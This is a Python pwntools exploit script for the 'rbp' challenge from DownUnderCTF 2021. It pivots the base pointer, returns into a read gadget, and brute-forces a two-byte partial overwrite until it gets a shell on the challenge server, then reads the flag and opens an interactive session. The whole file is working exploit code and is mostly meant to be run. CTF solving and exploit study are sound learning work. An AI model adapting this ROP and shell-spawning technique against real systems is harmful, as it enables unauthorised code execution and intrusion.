#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

host, port = "pwn-2021.duc.tf","31910"

# return inside read_long function
gadget1 = 0x4011b1
'''
  4011b1:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  4011b5:	ba 13 00 00 00       	mov    edx,0x13
  4011ba:	48 89 c6             	mov    rsi,rax
  4011bd:	bf 00 00 00 00       	mov    edi,0x0
  4011c2:	e8 89 fe ff ff       	call   401050 <read@plt>
  4011c7:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  4011cb:	48 89 c7             	mov    rdi,rax
  4011ce:	e8 9d fe ff ff       	call   401070 <atol@plt>
  4011d3:	c9                   	leave  
  4011d4:	c3                   	ret    
'''

count=0
while (True):
  print(str(count))
  count +=1
  if args.LOCAL:
    p = process('./rbp')
  else:
    p = remote(host,port)
  payload = p64(0x404047)+p64(gadget1)
  p.sendafter('name? ',payload)
  p.sendafter('number? ','-32 '+'B'*15)
  p.send('/bin/sh'.ljust(0x11,'\x00')+'\x60\xda')
  p.sendline('id;')
  try:
    buff = p.recvuntil('uid', timeout=5)
    break
  except:
    p.close()

print(buff)
p.sendline('cat flag*')

p.interactive()
